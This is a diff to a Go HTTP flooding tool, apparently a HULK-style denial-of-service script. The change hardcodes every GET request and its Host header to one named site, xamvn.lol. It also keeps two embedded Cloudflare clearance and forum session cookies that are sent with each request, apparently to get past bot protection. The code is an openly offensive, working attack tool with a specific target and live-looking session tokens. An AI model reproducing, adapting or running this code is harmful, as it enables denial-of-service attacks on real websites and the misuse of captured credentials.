@@ -42,41 +42,10 @@ var (
 	safe            bool     = false
 
 
-	headersReferers []string = []string{
-	"http://www.google.com/?q=",
-		"https://duckduckgo.com/?q=",
-		"https://www.bing.com/search?q=",
-		"https://coccoc.com/search?query=",
-		"https://search.aol.com/aol/search?q=",
-		"https://www.ecosia.org/search?method=index&q=",
-		"https://www.ask.com/web?q=",
-		"http://www.usatoday.com/search/results?q=",
-		"http://engadget.search.aol.com/search?q=",
-		"http://www.google.ru/?hl=ru&q=",
-		"http://yandex.ru/yandsearch?text=",
-                "https://www.youtube.com/results?search_query=",
-                "https://www.tiktok.com/search?q=",
-                "https://twitter.com/search?q=",
-                "https://www.shodan.io/search?query=",
-                "http://web.archive.org/web/20230000000000*/",
-                "https://www.reddit.com/search/?q=",
-                "https://www.quora.com/search?q=",
-                "https://check-host.net/",
-		"https://www.facebook.com/",
-		"https://www.youtube.com/",
-		"https://www.fbi.com/",
-		"https://r.search.yahoo.com/",
-		"https://www.cia.gov/index.html",
-		"https://vk.com/profile.php?auto=",
-		"https://help.baidu.com/searchResult?keywords=",
-		"https://steamcommunity.com/market/search?q=",
-		"https://www.ted.com/search?q=",
-		"https://play.google.com/store/search?q=",
-	}
+	
 	headersUseragents []string = []string{
-		"cf_clearance=tiQggH2GqK.LFUEMu9YhLKmBzKqD2A1uoVl53uXaB1Q-1683045824-0-250; xfa_user=443662%2CrTQ-qi1iQ28Q__hYmMyPEZtLaXqQnwNosu2bVXX0",
+	"cf_clearance=tiQggH2GqK.LFUEMu9YhLKmBzKqD2A1uoVl53uXaB1Q-1683045824-0-250; xfa_user=443662%2CrTQ-qi1iQ28Q__hYmMyPEZtLaXqQnwNosu2bVXX0",
 "cf_clearance=ssDBEQH_MMdRHUnDg0ABPH5NxioTpzuVIqNw6eGBrLw-1683046167-0-250; xfa_user=443661%2C2rYfeGsw630vT_-3aRTS07KWxHSGj61GfBeUEYbP",
-		
 	}
 	cur int32
 )
@@ -197,7 +166,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 
 		if data == "" {
 			//q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
-                q, err = http.NewRequest("GET", url, nil)
+                q, err = http.NewRequest("GET", "https://xamvn.lol", nil)
 
 		} else {
 			q, err = http.NewRequest("POST", url, strings.NewReader(data))
@@ -226,7 +195,7 @@ q.Header.Set("Cookie", headersUseragents[rand.Intn(len(headersUseragents))])
 		//q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 		//q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
-		q.Header.Set("Host", host)
+		q.Header.Set("Host", "xamvn.lol")
 
 		// Overwrite headers with parameters
 
